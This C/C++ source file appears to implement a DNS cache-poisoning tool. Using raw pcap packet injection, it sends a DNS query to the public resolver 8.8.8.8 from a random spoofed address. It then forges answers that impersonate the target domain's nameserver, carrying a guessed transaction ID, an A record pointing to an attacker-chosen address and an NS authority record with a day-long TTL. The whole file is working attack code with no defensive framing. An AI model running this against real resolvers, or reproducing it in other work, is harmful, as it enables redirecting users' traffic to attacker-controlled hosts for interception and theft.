#include "nestori.h"

bool sendDgram(pcap_t* handle, uint8_t* from, uint8_t* to, uint16_t fromport, uint16_t toport, u_char* data, DWORD sz, uint8_t* gateway) {
	if (from == NULL) {
		uint8_t ranIP[4] = { rand(), rand() , rand() , rand() };
		from = ranIP;
	}

	u_char pkt[200];
	ether_header* eth = (ether_header*)pkt;
	ip_hdr* ip = (ip_hdr*)&pkt[sizeof ether_header];
	udp_hdr* udp = (udp_hdr*)&pkt[sizeof ether_header + sizeof ip_hdr];

	memcpy(eth->src, gateway, 6);
	memcpy(eth->dest, gateway, 6);
	eth->type = htons(0x0800);

	ip->ver = 4;
	ip->ihl = sizeof ip_hdr / sizeof ULONG;
	ip->dscp = 0;
	ip->ecn = 1;
	ip->len = htons(sizeof ip_hdr + sizeof udp_hdr + sz);
	ip->id = 0;
	ip->flags = 0;
	ip->fOff = 0;
	ip->ttl = 128;
	ip->proto = IPPROTO_UDP;
	ip->csum = 0;
	memcpy(ip->src, from, 4);
	memcpy(ip->dest, to, 4);
	ip->csum = checksum((uint16_t*)ip, sizeof ip_hdr);

	udp->src = htons(fromport);
	udp->dest = htons(toport);
	udp->len = htons(sizeof udp_hdr + sz);
	udp->csum = htons(checksum((uint16_t*)udp, sizeof udp_hdr));

	memcpy(&pkt[sizeof ether_header + sizeof ip_hdr + sizeof udp_hdr], data, sz);
	return (pcap_sendpacket(handle, pkt, sizeof ether_header + sizeof ip_hdr + sizeof udp_hdr + sz) != -1);
}

bool send_question(pcap_t* handle, string target, uint8_t* gateway) {
	u_char pkt[200];
	dns_hdr* dns = (dns_hdr*)pkt;

	uint8_t google[4] = { 8, 8, 8, 8 };

	dns->tid = htons(rand());
	dns->flags = htons(0x0100);
	dns->qcount = htons(1);
	dns->acount = htons(0);
	dns->aucount = htons(0);
	dns->adcount = htons(0);

	memcpy(&pkt[sizeof dns_hdr], target.c_str(), target.length());
	memset(&pkt[sizeof dns_hdr + target.length()], 0x00, 1);
	memset(&pkt[sizeof dns_hdr + target.length() + 1], 0x01, 1);
	memset(&pkt[sizeof dns_hdr + target.length() + 2], 0x00, 1);
	memset(&pkt[sizeof dns_hdr + target.length() + 3], 0x01, 1);

	return sendDgram(handle, NULL, google, 5000 + rand() / 8, 53, pkt, sizeof dns_hdr + target.length() + 4, gateway);
}

bool send_answer(pcap_t* handle, string target, string s_targetns, uint8_t* targetns, uint8_t* ndest, uint8_t* gateway, uint16_t tid) {
	u_char pkt[200];
	dns_hdr* dns = (dns_hdr*)pkt;
	dns_rcrd* record = (dns_rcrd*)&pkt[sizeof dns_hdr + target.length() * 2 + 4];
	dns_rcrd* auth = (dns_rcrd*)&pkt[sizeof dns_hdr + target.length() * 3 + 18];
	int sz = 0;

	uint8_t google[4] = { 8, 8, 8, 8 };

	dns->tid = htons(tid);
	dns->flags = htons(0x8400);
	dns->qcount = htons(1);
	dns->acount = htons(1);
	dns->aucount = htons(1);
	dns->adcount = htons(0);
	sz += sizeof dns_hdr;

	memcpy(&pkt[sz], target.c_str(), target.length());
	memset(&pkt[sz + target.length()], 0x00, 1);
	memset(&pkt[sz + target.length() + 1], 0x01, 1);
	memset(&pkt[sz + target.length() + 2], 0x00, 1);
	memset(&pkt[sz + target.length() + 3], 0x01, 1);
	sz += target.length() + 4;

	memcpy(&pkt[sz], target.c_str(), target.length());
	record->type = htons(1);
	record->clss = htons(1);
	record->ttl = htonl(86400);
	record->rdlen = htons(4);
	memcpy(&pkt[sz + target.length() + 10], ndest, 4);
	sz += target.length() + 14;

	memcpy(&pkt[sz], target.c_str(), target.length());
	auth->type = htons(2);
	auth->clss = htons(1);
	auth->ttl = htonl(86400);
	auth->rdlen = htons(s_targetns.length());
	memcpy(&pkt[sz + target.length() + 10], s_targetns.c_str(), s_targetns.length());
	sz += target.length() + s_targetns.length() + 10;

	return sendDgram(handle, targetns, google, 53, 53, pkt, sz, gateway);
}